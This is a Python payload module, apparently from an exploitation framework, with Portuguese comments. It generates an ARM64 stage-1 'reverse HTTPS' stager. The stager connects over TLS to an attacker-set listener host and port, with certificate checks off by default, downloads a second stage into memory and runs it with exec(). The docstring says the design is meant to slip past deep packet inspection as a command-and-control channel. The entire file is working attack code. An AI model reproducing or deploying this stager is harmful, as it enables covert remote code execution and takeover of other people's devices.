"""ARM64 Reverse HTTPS Shell (TLS over TCP).

Stage 1: conecta via TLS ao handler, recebe stage 2 em memória.
Bypassa DPI que inspeciona conteúdo TCP não-TLS.
"""

import ssl
from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "ARM64 Reverse HTTPS",
        "description": "Stage-1 reverse HTTPS payload for ARM64 — TLS encrypted C2 channel.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "HTTPS listener IP/domain", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "HTTPS listener port", "required": True, "default": "443", "value": "443"},
        "VERIFY_CERT": {"description": "Verify TLS certificate", "required": False, "default": "false", "value": "false"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        verify = self.options["VERIFY_CERT"]["value"].lower() == "true"
        verify_str = "True" if verify else "False"

        # Python stager — compilável para ARM64 via PyInstaller + musl cross
        stager = f"""#!/usr/bin/env python3
import ssl,socket,subprocess,os,sys
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname=False
ctx.verify_mode=ssl.CERT_REQUIRED if {verify_str} else ssl.CERT_NONE
with socket.create_connection(('{lhost}',{lport})) as raw:
    with ctx.wrap_socket(raw,server_hostname='{lhost}') as s:
        stage2=b''
        while True:
            chunk=s.recv(4096)
            if not chunk:break
            stage2+=chunk
        exec(compile(stage2,'<stage2>','exec'))
"""
        return stager.encode()
